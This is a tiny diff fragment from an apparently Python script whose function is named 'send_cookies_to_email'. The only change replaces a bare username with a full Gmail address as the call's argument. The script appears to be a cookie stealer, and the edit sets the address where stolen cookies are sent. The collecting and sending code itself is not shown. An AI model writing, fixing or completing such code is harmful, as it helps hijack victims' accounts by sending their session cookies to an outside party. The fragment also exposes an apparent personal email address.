@@ -36,4 +36,4 @@ def send_cookies_to_email(email):
     else:
         print("404 not found .")
 
-send_cookies_to_email('kkara9009')
+send_cookies_to_email('kkara9009@gmail.com')
